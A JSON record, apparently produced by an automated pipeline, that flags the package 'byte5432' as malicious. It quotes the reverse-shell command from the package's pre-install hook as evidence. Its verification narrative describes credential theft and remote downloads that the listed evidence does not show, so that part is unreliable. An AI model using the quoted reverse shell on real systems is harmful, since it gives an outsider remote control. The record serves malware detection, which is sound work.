@@ -1,0 +1,53 @@
+{
+  "package_name": "byte5432",
+  "version": "1.0.3",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "backdoor_installation"
+    ],
+    "behaviors": [
+      {
+        "category": "backdoor_installation",
+        "summary": "The package contains a backdoor installation signal in the pre-install hook.",
+        "details": "The pre-install hook contains a reverse shell command that connects to an external IP address (121.43.55.52) on port 23330.",
+        "confidence": 0.96,
+        "evidence_commands": [
+          "bash-c'bash-i>&/dev/tcp/121.43.55.52/23330>&1'"
+        ],
+        "evidence_files": [],
+        "evidence_apis": [],
+        "evidence_domains": [],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": "This JSON object describes the malicious intent of the package. The package contains a backdoor installation signal in the pre-install hook, which is confirmed with a high confidence score of 0.96. The reverse shell command connects to an external IP address (121.43.55.52) on port 23330."
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "is_coherent_chain": true,
+      "chain_narrative": "Obfuscation reads env credentials -> POST to external domain -> install hook downloads remote script -> execute it",
+      "chain_score": 0.71
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package purpose is not obfuscation, POSTing to an external domain, or installing a remote script, which is not justified by the detected behaviors",
+      "legitimacy_score": 0.4
+    },
+    "final_verification": {
+      "verdict": "MALICIOUS",
+      "calibrated_confidence": 0.8,
+      "explanation": "The package contains a backdoor installation signal in the pre-install hook, which is confirmed with a high confidence score of 0.96. The reverse shell command connects to an external IP address (121.43.55.52) on port 23330. The package purpose does not match the detected behaviors, which makes it malicious."
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "flag",
+    "structural_risk_score": 1.0,
+    "confirmed_signals_count": 3,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T10:06:07.689226"
+}
